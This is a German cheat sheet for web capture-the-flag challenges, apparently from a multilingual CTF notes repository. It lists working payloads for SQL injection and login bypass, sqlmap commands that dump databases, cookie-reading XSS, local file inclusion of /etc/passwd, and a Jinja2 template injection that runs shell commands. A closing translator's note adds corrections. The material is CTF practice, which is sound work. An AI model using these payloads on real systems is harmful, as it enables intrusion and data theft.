# 🌐 Spickzettel für Web-CTFs

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Web-CTF.tr.md) • [🇬🇷 Ελληνικά](Web-CTF.el.md)

---

## 💉 SQL Injection

### Grundlegende Payloads
```sql
' OR 1=1--
' OR '1'='1
" OR ""="
admin'--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
```

### SQLMap
```bash
sqlmap -u "http://url?id=1" --dbs
sqlmap -u "http://url?id=1" -D dbname --tables
sqlmap -u "http://url?id=1" -D dbname -T users --dump
```

---

## 📜 XSS (Cross-Site Scripting)

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(document.cookie)</script>
javascript:alert(1)
```

---

## 📁 LFI (Local File Inclusion)

```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
/etc/passwd%00
php://filter/convert.base64-encode/resource=index.php
```

---

## 🔧 SSTI (Server-Side Template Injection)

### Erkennung
```
{{7*7}}     → 49 (Jinja2/Twig)
${7*7}      → 49 (Freemarker)
<%= 7*7 %>  → 49 (ERB)
```

### Jinja2 RCE
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

---

## 🔐 Umgehung der Authentifizierung

```
admin' --
admin'/*
' OR 1=1 LIMIT 1--
Password: ' OR '1'='1
```

---

## 🍪 Cookie/JWT

```bash
# JWT dekodieren
echo "eyJ..." | base64 -d

# Werkzeuge
jwt_tool.py token
jwt.io (online)
```

---

## 🛠️ Nützliche Werkzeuge

```bash
# Verzeichnisse systematisch ausprobieren
gobuster dir -u http://url -w wordlist.txt

# Fuzzing
ffuf -u http://url/FUZZ -w wordlist.txt

# Parameter ermitteln
arjun -u http://url
```

---

## 📋 Checkliste für Web-CTFs

```markdown
□ Quelltext prüfen (Ctrl+U)
□ robots.txt und sitemap.xml prüfen
□ Cookies und JWT prüfen
□ Eingaben auf SQLi prüfen
□ Eingaben auf XSS prüfen
□ Dateiparameter auf LFI prüfen
□ Auf SSTI prüfen
□ Verzeichnisse systematisch ausprobieren
□ Auf einen offengelegten .git-Ordner prüfen
```

---

**Zurück zu CTF:** [🏁 CTF-Übersicht](./README.de.md)

---

## Hinweise zur deutschen Ausgabe

> **Korrektur zur JWT-Dekodierung:** Ein JWT besteht aus durch Punkte getrennten, Base64url-kodierten Teilen; bei einem signierten JWS sind es üblicherweise drei. Der Platzhalter `eyJ...` ist kein vollständiges Token, und das gesamte Token lässt sich nicht als ein einzelner gewöhnlicher Base64-Block dekodieren. Dekodierung allein prüft keine Signatur und keine zulässigen Claims. [JWT: RFC 7519](https://www.rfc-editor.org/rfc/rfc7519.html).

> **Kontext der Payloads:** SQL-Syntax, Kommentarregeln, Template-Engine und zugängliche Objekte sind umgebungsabhängig. Ein Ergebnis 49 allein identifiziert keine Template-Engine eindeutig. Das Jinja2-Beispiel ist Template-Syntax, kein eigenständig ausführbares Python-Programm. `%00` zeigt eine historische Nullbyte-Technik, die nicht für aktuelle Laufzeiten allgemein gilt. `jwt.io (online)` ist ein Websiteverweis, kein Shell-Befehl; `Password:` kennzeichnet in der Vorlage ein Eingabefeld. Payloads, URLs und Suchwerte wurden unverändert übernommen.
